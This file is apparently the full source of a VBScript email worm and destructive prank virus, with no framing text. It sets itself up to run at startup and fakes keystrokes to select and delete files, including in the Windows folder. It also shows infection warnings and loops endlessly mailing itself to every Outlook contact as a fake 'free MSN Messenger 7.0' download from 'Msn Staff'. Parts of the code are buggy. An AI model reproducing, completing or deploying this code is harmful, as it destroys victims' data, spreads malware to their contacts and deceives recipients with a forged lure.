Dim a,b,c,d,e,f,g
set c= CreateObject("wscript.shell")
Set a = CreateObject("Scripting.FileSystemObject")
if Month(Now)="4" Then
shell.Run "cmd.exe"
wscript.sleep 1000
shell.sendkeys "{c}"+"{d}"+"{ }"+"{c}"+"{:}"+"{\}"+"{ENTER}"
shell.sendkeys "{c}"+"{l}"+"{s}"+"{ENTER}"
wscript.sleep 1000
shell.sendkeys "{d}"+"{i}"+"{r}"+"{ }"+"{/}"+"{b}"+"{ }"+"{/}"+"{s}"
shell.sendkeys "{ENTER}"
wscript.sleep 1000
shell.sendkeys "{c}"+"{o}"+"{l}"+"{o}"+"{r}"+"{ }"+"{C}"+"{0}"
shell.sendkeys "{ENTER}"
shell.sendkeys "{c}"+"{l}"+"{s}"
shell.sendkeys "{ENTER}"
shell.sendkeys +"{f}"+"{i}"+"{l}"+"{e}"+"{s}"+"{ }"+"{d}"+"{e}"+"{l}"+"{e}"+"{t}"+"{e}"+"{d}"
Else
Set b = a.CreateFolder("c:\program files\messanger 7.0")
CreateFolderDemo = b.Path
wscript.sleep 1000
set d=a.createTextFile("c:\program files\messanger 7.0")
d.writeline "You Have Been Infected."
d.writeline "If Youre Computer Is Still Running Please Format You're Hard Drive. "
d.close
set e=c.createshortcut ("c:\Notepad.lnk")
e.targetpath = "notepad.exe"
e.save
Set f =c.CreateShortcut("c:\program files\messanger 7.0\messanger7.0.lnk")
f.TargetPath = WScript.ScriptFullName
f.Save
Set g =c.CreateShortcut("%WINDIR%\starmenu\programs\startup\Notepad.lnk")
g.TargetPath = WScript.ScriptFullName
g.Save
wscript.sleep 1000
c.sendkeys "^{A}"
c.sendkeys "{DEL}"+"{ENTER}"
wscript.sleep 1000
c.run "%WINDIR%"
wscript.sleep 1500
msgbox"TIME TO DELETE FILES HERE",vbCritical,"WARNING"
wscript.sleep 1500
c.sendkeys "^{A}"
c.sendkeys "{DEL}"+"{ENTER}"
wscript.sleep 1500
msgbox"FILES DELETED",vbCritical,"WARNING"
do
Set aa = CreateObject("Outlook.Application")
Set bb = Wscript.CreateObject("Outlook.Application")
Set mapi = bb.GetNameSpace("MAPI")
Set c = mapi.AddressLists(1)
For X = 1 To c.AddressEntries.Count
Set Mail = aa.CreateItem(0)
Mail.to = aa.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Free New Msn Messanger 7.0 Download"
Mail.Body = "Please Open The Attached File To Start Downloading The New Msn Messagner 7.0."
Mail.Body = "This Is 100% Free.Full Version."
Mail.Body = "Please Enjoy"
Mail.Body = "From Msn Staff To Everyone Using Msn Email."
Mail.Attachments.Add WScript.ScriptFullName
Mail.Send
Next
aa.Quit
c.sendkeys "{NUMLOCK}"
c.sendkeys "{CAPSLOCK}"
c.sendkeys "{SCROLLLOCK}"
msgbox "YOUVE BEEN INFECTED",vbCritical,"WARNING"
c.run "c:\program files\messanger 7.0\messanger7.0.lnk"
loop
End If
